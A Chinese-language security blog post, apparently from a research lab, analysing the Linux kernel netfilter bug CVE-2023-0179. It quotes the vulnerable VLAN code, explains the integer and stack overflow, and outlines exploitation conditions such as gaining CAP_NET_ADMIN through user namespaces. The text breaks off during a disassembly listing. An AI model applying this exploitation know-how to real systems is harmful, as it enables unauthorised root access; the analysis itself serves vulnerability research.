<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>CVE-2023-0179 Linux内核提权 | 天工实验室</title>
<meta name="keywords" content="Linux, Privilege Escalation">
<meta name="description" content="CVE-2023-0179 Linux内核提权 0x00 前言 2022年7月为天府杯准备的Linux提权漏洞，但是22年天府杯没办，23年1月被外国人报了。
思路来源于这篇文章，在看到这篇文章后决定去好好过一下netfilter相关模块。
文章链接：How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables
0x01 背景 该漏洞位于Linux内核中netfilter模块对vlan进行处理的相关代码中，由于整型溢出导致的栈溢出，最后是ROP修改modprobe_path路径完成提权，在Ubuntu下测试可以稳定触发，提权成功率百分之百。
0x02 漏洞成因，加还是减 下面是漏洞代码，处理vlan相关的部分代码。
/* add vlan header into the user buffer for if tag was removed by offloads */ static bool nft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len) { int mac_off = skb_mac_header(skb) - skb-&gt;data; u8 *vlanh, *dst_u8 = (u8 *) d; struct vlan_ethhdr veth; u8 vlan_hlen = 0; if ((skb-&gt;protocol == htons(ETH_P_8021AD) || skb-&gt;protocol == htons(ETH_P_8021Q)) &amp;&amp; offset &gt;= VLAN_ETH_HLEN &amp;&amp; offset &lt; VLAN_ETH_HLEN &#43; VLAN_HLEN) vlan_hlen &#43;= VLAN_HLEN; vlanh = (u8 *) &amp;veth; if (offset &lt; VLAN_ETH_HLEN &#43; vlan_hlen) { u8 ethlen = len; if (vlan_hlen &amp;&amp; skb_copy_bits(skb, mac_off, &amp;veth, VLAN_ETH_HLEN) &lt; 0) return false; else if (!">
<meta name="author" content="limin06">
<link rel="canonical" href="http://localhost:1313/blog/tiangongarticle001/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0c42f9222bc665b5845e6199fc07fd87b025125d3366cc5f873b0f54ca8481.css" integrity="sha256-mwxC&#43;SIrxmW1hF5hmfwH/YewJRJdM2bMX4c7D1TKhIE=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/blog/tiangongarticle001/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="天工实验室 (Alt + H)">
                <img src="http://localhost:1313/logo/logo3.png" alt="" aria-label="logo"
                    height="100" style="margin-top: 15px;">
            </a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="https://poc.qianxin.com/home" title="破壳官网">
                    <span>破壳官网</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/">博客</a></div>
    <h1 class="post-title entry-hint-parent">
      CVE-2023-0179 Linux内核提权
    </h1>
    <div class="post-meta"><span title='2023-10-18 00:00:00 +0000 UTC'>2023年10月18日</span>&nbsp;·&nbsp;4 分钟&nbsp;·&nbsp;limin06

</div>
  </header>

  <div class="author">
    <div class="author_avatar">
      <img src="/authors/lm0963.jpg" alt="limin06">
    </div>
    <div class="author_info">
      <span class="author_id">limin06</span>
      <p class="author_description">微软 MSRC 全球最具价值安全精英榜上榜者</p>
    </div>
  </div>
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
      <li><a href="http://localhost:1313/tags/privilege-escalation/">Privilege Escalation</a></li>
    </ul><br/> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#cve-2023-0179-linux%e5%86%85%e6%a0%b8%e6%8f%90%e6%9d%83" aria-label="CVE-2023-0179 Linux内核提权">CVE-2023-0179 Linux内核提权</a><ul>
                        
                <li>
                    <a href="#0x00-%e5%89%8d%e8%a8%80" aria-label="0x00 前言">0x00 前言</a></li>
                <li>
                    <a href="#0x01-%e8%83%8c%e6%99%af" aria-label="0x01 背景">0x01 背景</a></li>
                <li>
                    <a href="#0x02-%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0%e5%8a%a0%e8%bf%98%e6%98%af%e5%87%8f" aria-label="0x02 漏洞成因，加还是减">0x02 漏洞成因，加还是减</a></li>
                <li>
                    <a href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="0x03 漏洞利用">0x03 漏洞利用</a><ul>
                        
                <li>
                    <a href="#%e6%9d%a1%e4%bb%b6%e4%b8%80%e9%9c%80%e8%a6%81cap_net_admin%e6%9d%83%e9%99%90" aria-label="条件一：需要CAP_NET_ADMIN权限">条件一：需要CAP_NET_ADMIN权限</a></li>
                <li>
                    <a href="#%e6%9d%a1%e4%bb%b6%e4%ba%8c%e6%ba%a2%e5%87%ba%e7%9a%84%e9%95%bf%e5%ba%a6%e4%b8%8d%e8%b6%b3" aria-label="条件二：溢出的长度不足">条件二：溢出的长度不足</a></li>
                <li>
                    <a href="#%e6%9d%a1%e4%bb%b6%e4%b8%89%e8%a7%a6%e5%8f%91%e6%bc%8f%e6%b4%9e%e6%97%b6%e5%86%85%e6%a0%b8%e4%b8%8a%e4%b8%8b%e6%96%87%e4%b8%8d%e7%a1%ae%e5%ae%9a" aria-label="条件三：触发漏洞时内核上下文不确定">条件三：触发漏洞时内核上下文不确定</a></li></ul>
                </li>
                <li>
                    <a href="#0x04-%e6%80%bb%e7%bb%93" aria-label="0x04 总结">0x04 总结</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="cve-2023-0179-linux内核提权">CVE-2023-0179 Linux内核提权<a hidden class="anchor" aria-hidden="true" href="#cve-2023-0179-linux内核提权">#</a></h1>
<h2 id="0x00-前言">0x00 前言<a hidden class="anchor" aria-hidden="true" href="#0x00-前言">#</a></h2>
<p>2022年7月为天府杯准备的Linux提权漏洞，但是22年天府杯没办，23年1月被外国人报了。</p>
<p>思路来源于这篇文章，在看到这篇文章后决定去好好过一下netfilter相关模块。</p>
<p>文章链接：<a href="https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/">How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables</a></p>
<!-- raw HTML omitted -->
<h2 id="0x01-背景">0x01 背景<a hidden class="anchor" aria-hidden="true" href="#0x01-背景">#</a></h2>
<p>该漏洞位于Linux内核中netfilter模块对vlan进行处理的相关代码中，由于整型溢出导致的栈溢出，最后是ROP修改modprobe_path路径完成提权，在Ubuntu下测试可以稳定触发，提权成功率百分之百。</p>
<h2 id="0x02-漏洞成因加还是减">0x02 漏洞成因，加还是减<a hidden class="anchor" aria-hidden="true" href="#0x02-漏洞成因加还是减">#</a></h2>
<p>下面是漏洞代码，处理vlan相关的部分代码。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">/* add vlan header into the user buffer for if tag was removed by offloads */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#a6e22e">bool</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nft_payload_copy_vlan</span>(<span style="color:#a6e22e">u32</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">d</span>, <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sk_buff</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">u8</span> <span style="color:#a6e22e">offset</span>, <span style="color:#a6e22e">u8</span> <span style="color:#a6e22e">len</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">mac_off</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_mac_header</span>(<span style="color:#a6e22e">skb</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">skb</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">u8</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">vlanh</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">dst_u8</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">u8</span> <span style="color:#f92672">*</span>) <span style="color:#a6e22e">d</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">vlan_ethhdr</span> <span style="color:#a6e22e">veth</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">u8</span> <span style="color:#a6e22e">vlan_hlen</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">skb</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">protocol</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">htons</span>(<span style="color:#a6e22e">ETH_P_8021AD</span>) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">skb</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">protocol</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">htons</span>(<span style="color:#a6e22e">ETH_P_8021Q</span>)) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">offset</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">VLAN_HLEN</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vlan_hlen</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">VLAN_HLEN</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vlanh</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">u8</span> <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">veth</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">offset</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">u8</span> <span style="color:#a6e22e">ethlen</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">len</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">vlan_hlen</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">skb_copy_bits</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">mac_off</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">veth</span>, <span style="color:#a6e22e">VLAN_ETH_HLEN</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">nft_payload_rebuild_vlan_hdr</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">mac_off</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">veth</span>))
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ethlen</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#a6e22e">dst_u8</span>, <span style="color:#a6e22e">vlanh</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">vlan_hlen</span>, <span style="color:#a6e22e">ethlen</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">len</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">ethlen</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dst_u8</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">ethlen</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">offset</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">offset</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">VLAN_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">skb_copy_bits</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">mac_off</span>, <span style="color:#a6e22e">dst_u8</span>, <span style="color:#a6e22e">len</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这一段代码好像有点问题？<strong>整数溢出！！！</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ethlen</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>;
</span></span></code></pre></div><p>在判断if (offset + len &gt; VLAN_ETH_HLEN + vlan_hlen)后，应该用offset + len减去VLAN_ETH_HLEN + vlan_hlen，很明显代码中少了括号运算，修复补丁也是简单的将+改为-。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">-</span> (<span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">vlan_hlen</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>=&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">VLAN_ETH_HLEN</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">vlan_hlen</span>
</span></span></code></pre></div><p><strong>栈溢出！！！</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#a6e22e">dst_u8</span>, <span style="color:#a6e22e">vlanh</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">vlan_hlen</span>, <span style="color:#a6e22e">ethlen</span>);
</span></span></code></pre></div><p>dst_u8(rdi)指向上层调用函数的regs栈上变量，vlanh(rsi)指向veth栈上变量，ethlen(rcx &lt;&lt; 3)在整数溢出后会变为一个较大值。</p>
<p><img loading="lazy" src="/attachments/2023-10-18-cve-2023-0179-linux/7848c444-c556-44ba-a298-91e2573502d7.png" alt=""  />
</p>
<h2 id="0x03-漏洞利用">0x03 漏洞利用<a hidden class="anchor" aria-hidden="true" href="#0x03-漏洞利用">#</a></h2>
<h3 id="条件一需要cap_net_admin权限">条件一：需要CAP_NET_ADMIN权限<a hidden class="anchor" aria-hidden="true" href="#条件一需要cap_net_admin权限">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nfnetlink_rcv</span>(<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sk_buff</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">skb</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nlmsghdr</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">nlh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nlmsg_hdr</span>(<span style="color:#a6e22e">skb</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">skb</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">len</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">NLMSG_HDRLEN</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">nlh</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nlmsg_len</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">NLMSG_HDRLEN</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">skb</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">len</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">nlh</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nlmsg_len</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">netlink_net_capable</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">CAP_NET_ADMIN</span>)) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">netlink_ack</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">nlh</span>, <span style="color:#f92672">-</span><span style="color:#a6e22e">EPERM</span>, <span style="color:#a6e22e">NULL</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">nlh</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nlmsg_type</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">NFNL_MSG_BATCH_BEGIN</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">nfnetlink_rcv_skb_batch</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">nlh</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">netlink_rcv_skb</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">nfnetlink_rcv_msg</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">netlink_net_capable</span>(<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">sk_buff</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">skb</span>, <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">cap</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">netlink_ns_capable</span>(<span style="color:#a6e22e">skb</span>, <span style="color:#a6e22e">sock_net</span>(<span style="color:#a6e22e">skb</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sk</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_ns</span>, <span style="color:#a6e22e">cap</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>命令空间</strong></p>
<p>Linux下默认的根命令空间是init_user_ns，如果CONFIG_USER_NS和CONFIG_NET_NS配置选项开启，用户便可以创建自己的命令空间，并且在该用户命令空间中获得所有权限。所以可以通过创建新的命令空间以满足上述CAP_NET_ADMIN权限检查。</p>
<p><img loading="lazy" src="/attachments/2023-10-18-cve-2023-0179-linux/81f59f3f-098d-4671-8167-b943b5629a35.png" alt=""  />
</p>
<h3 id="条件二溢出的长度不足">条件二：溢出的长度不足<a hidden class="anchor" aria-hidden="true" href="#条件二溢出的长度不足">#</a></h3>
<p>ethlen的类型是u8，那么最大值为0xff，很明显不足以覆盖返回地址，regs变量后跟着nft_jumpstack结构体数组，长度为16，大小为256字节。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">define</span> <span style="color:#a6e22e">NFT_JUMP_STACK_SIZE</span>  <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_jumpstack</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_chain</span>  <span style="color:#f92672">*</span><span style="color:#a6e22e">chain</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_rule</span>  <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rules</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nft_do_chain</span>(<span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_pktinfo</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">pkt</span>, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">priv</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_chain</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">chain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">priv</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">basechain</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chain</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_net</span>(<span style="color:#a6e22e">pkt</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_rule</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rules</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_rule</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rule</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_expr</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">expr</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">last</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_regs</span> <span style="color:#a6e22e">regs</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">stackptr</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_jumpstack</span> <span style="color:#a6e22e">jumpstack</span>[<span style="color:#a6e22e">NFT_JUMP_STACK_SIZE</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">genbit</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">READ_ONCE</span>(<span style="color:#a6e22e">net</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nft</span>.<span style="color:#a6e22e">gencursor</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_traceinfo</span> <span style="color:#a6e22e">info</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>......
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ida反汇编结果</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">__fastcall</span> <span style="color:#a6e22e">nft_do_chain</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__int64</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">a1</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">struct</span> <span style="color:#a6e22e">nft_regs</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">a2</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">a3</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">a4</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">a5</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">a6</span>,
